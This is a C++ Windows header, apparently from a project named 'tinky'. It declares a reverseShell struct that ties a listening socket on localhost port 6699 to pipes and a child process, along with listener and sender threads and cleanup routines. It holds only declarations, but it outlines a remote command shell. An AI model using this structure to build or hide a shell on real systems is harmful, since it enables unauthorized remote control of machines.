#pragma once

#include <ws2tcpip.h>
#include <windows.h>
#include <iostream>

#define HOSTNAME "localhost"
#define PORT "6699"

#define BUFFER_SIZE 4096

#define PROCESS_STOP "Global\\stop_tinky_processes"

#define CONTINUE 1
#define SUCCESS 1
#define FAILURE 0

typedef struct reverseShell {
	// socket {
	addrinfo	addrHints;
	addrinfo	*addrResult;

	SOCKET		listenSocket;
	SOCKET		clientSocket;
	// }

	// pipe {
	HANDLE					childRead ;
	HANDLE					parentWrite;

	HANDLE					childWrite;
	HANDLE					parentRead;

	SECURITY_ATTRIBUTES		secAttributes;
	// }

	// childProcess {
	STARTUPINFOW			startupInfo;
	PROCESS_INFORMATION		processInfo;
	// }

	// threads {
	HANDLE			threadListener;
	HANDLE			threadSender;
	HANDLE			threadsHandler;
	//

	HANDLE	stopEventsignal;

	BOOL				clientFound;
	CRITICAL_SECTION	lock;

}	reverseShell_t;

//#pragma pack(1)
typedef struct client {
	BOOL				found;
	CRITICAL_SECTION	lock;

	CRITICAL_SECTION	lockStop;
	BOOL				stop;
}	client_t;
//#pragma pack()

// =============== utils ===============
void journalReport(std::wstring msg);
BOOL processShouldStop(void);

// =============== threads.cpp ===============
void notifyStopSignal(void);
BYTE startRoutines(void);
DWORD WINAPI listener(LPVOID);
DWORD WINAPI sender(LPVOID);
// =============== networking.cpp ===============
BYTE initNetworking(void);
BYTE acceptClient(void);
// =============== cleanUp.cpp ===============
void cleanUp(std::wstring name);
void forceStop(void);